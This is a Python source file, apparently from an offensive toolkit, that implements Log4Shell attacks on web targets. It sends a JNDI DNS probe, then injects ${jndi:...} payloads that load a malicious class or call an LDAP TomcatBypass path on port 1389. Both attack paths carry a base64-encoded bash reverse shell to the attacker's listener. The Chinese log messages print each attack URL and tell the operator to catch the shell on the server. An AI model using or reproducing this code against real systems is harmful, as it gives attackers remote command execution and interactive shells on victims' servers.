import base64
from urllib.parse import quote

import requests

from Template import Template
from Jndi_exp import Jndi_exp


class Log4j_exp(Template):
    def log4j_scan(self):
        jndi_exp = Jndi_exp()
        url = self.rhost.replace("FUZZ", Template.encode_all(jndi_exp.getdns_payload()))
        print("log4j探测请求url地址:" + url)
        requests.get(url)
        jndi_exp.getdns_logs()

    def log4j_shell(self):
        command ="bash -i >& /dev/tcp/"+self.lhost+"/"+self.lport+" 0>&1"
        command = "bash -c {echo," + base64.b64encode(command.encode('utf-8')).decode(
            'utf-8') + "}|{base64,-d}|{bash,-i}"
        url = self.rhost.replace("FUZZ", Template.encode_all("${jndi:" + str(Jndi_exp().get_server1(command, self.lhost, self.lport) + "}")))
        print("log4j加载恶意class请求url地址:" + url)
        requests.get(url)
        print("请在服务端接收shell")

    def log4j_shell_bypass(self):
        Jndi_exp.get_server2(self.lhost, self.lport)
        command = "bash -i >& /dev/tcp/" + self.lhost + "/" + self.lport + " 0>&1"
        command = base64.b64encode(command.encode('utf-8')).decode('utf-8')
        command = quote(command)
        print("${jndi:ldap://" +self.lhost+":1389/TomcatBypass/Command/Base64/"+command+"}")
        url = self.rhost.replace("FUZZ", Template.encode_all("${jndi:ldap://" +self.lhost+":1389/TomcatBypass/Command/Base64/"+command+"}"))
        print("log4j加载恶意class请求url地址:" + url)
        requests.get(url)
        print("请在服务端接收shell")
